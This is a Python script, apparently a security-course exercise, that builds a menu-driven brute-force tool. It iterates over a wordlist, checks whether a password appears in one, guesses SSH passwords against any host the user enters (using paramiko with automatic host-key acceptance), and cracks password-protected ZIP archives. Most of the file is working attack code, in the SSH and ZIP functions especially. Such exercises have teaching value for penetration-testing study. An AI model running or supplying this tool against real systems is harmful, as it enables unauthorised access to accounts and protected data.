#!/bin/usr/python3

# Script Name:                  ops401-challenge18
# Author:                       Omar Ardid
# Date of latest revision:      05/22/2024
# Purpose:                      Adding ZIP File Brute Force
# Resources:                    https://docs.python.org/3/library/zipfile.html#module-zipfile

import time
import paramiko, os, sys, socket
import zipfile

def read_passwords(password_file):
    with open (password_file, "r") as file:
        return [line.rstrip() for line in file]
    
def check_filepath(file_path, file_description):
    if not os.path.isfile(file_path):
        print(f"(ง •̀_•́)ง {file_description} not found. Please enter a valid file path!")
        return False
    return True
    
def offensive():
    # Asking the user for word list
    wordlistpath = input("Enter word list file path: ") 
    # Checking the provided path is a file
    if check_filepath(wordlistpath, "Word file"):
        passwords = read_passwords(wordlistpath)
        for word in passwords:
            print(word)
            time.sleep(0.1) 

def defensive():
    # Asking the user for target string
    target_password = input("Enter a password to search: ")
    # Asking the user for word list
    wordlistpath = input("Enter word list file path: ")
    # Checking the provided path is a file
    if check_filepath(wordlistpath, "Word file"):
        passwords = read_passwords(wordlistpath)
        if target_password in passwords:
          print(f"Password '{target_password}' found in the word list.")
        else:
            print(f"Password '{target_password}' not found in the word list.") 
    else:
        print("(ง •̀_•́)ง Word file not found. Please enter a vaild file path! ")

def ssh_brute_force():    
        # Prompt the user for target host address, SSH username, and password file path
        host = input("Enter Target Host Address: ")
        username = input("Enter SSH Username: ")
        input_file = input("Enter SSH Password File: ")

        # Checks if file path exists
        if not check_filepath(input_file, "Password file"):
            return   
        try:
            with open(input_file, 'r') as file:
                for password in file:
                    password = password.rstrip()
                    try:
                        # Create an SSH Client instance
                        ssh = paramiko.SSHClient()
                        # Set policy for automatically adding host keys
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        # Attempt SSH connection using the current password
                        ssh.connect(host, port=22, username=username, password=password, banner_timeout=30, auth_timeout=30)
                        # Close the SSH connection
                        ssh.close()
                        # Print success message if password is correct
                        print(f"٩(◕‿◕)۶ Success! Password found: {password}")
                        return
                    except paramiko.AuthenticationException:
                        # Print error message if authentication fails
                        print(f"(.づ◡ ﹏◡)づ. Failed! incorrect password: {password}")
                    except socket.error as e:
                        # Print error message if a socket error occurs
                        print(f"(`･︿´･ ) An error occurred: {e}")
        except KeyboardInterrupt:
            print("User Requested An Interrupt")
            sys.exit(3)

def zip_file():
    zip_file = input("Enter the path to zipped file: ")
    password_file = input("Enter the path to password list: ")
    if not (check_filepath(zip_file, "ZIP file") and check_filepath(password_file, "Password file")):
        return
    passwords = read_passwords(password_file)

    with zipfile.ZipFile(zip_file) as zf:
        for password in passwords:
            try:
                zf.extractall(pwd=bytes(password,'utf-8'))
                print(f"٩(◕ ‿ ◕)۶ Success, Zipped File Brute Force extracted file with password: {password}")
                return
            except RuntimeError as e:
                if "Bad password" in str(e):
                    print(f"(ง •̀_•́)ง Failed password: {password}")
                else:
                    print(f"Error: {e}")
            except Exception as e:
                print(f"Error: {e}")
            time.sleep(0.1)

def menu():
    while True:
        print("\n~~~~~ Brute Force Wordlist Attack ~~~~~")
        print("1. Offensive; Dictionary Iterator")
        print("2. Defensive; Password Recognzied")
        print("3. SSH Brute Force")
        print("4. ZIP File Brute Force")
        print("0. Exit")
        choice = input("Enter a number: ")

        if choice == "1":
            offensive()
        elif choice == "2":
            defensive()
        elif choice == "3":
            ssh_brute_force()
        elif choice == "4":
            zip_file()
        elif choice == "0":
            print("(づ ◕‿◕ )づ Goodbye!")
            break
        else:
            print("\nง •̀_•́)ง Invalid number! ")

if __name__ == "__main__":
    menu()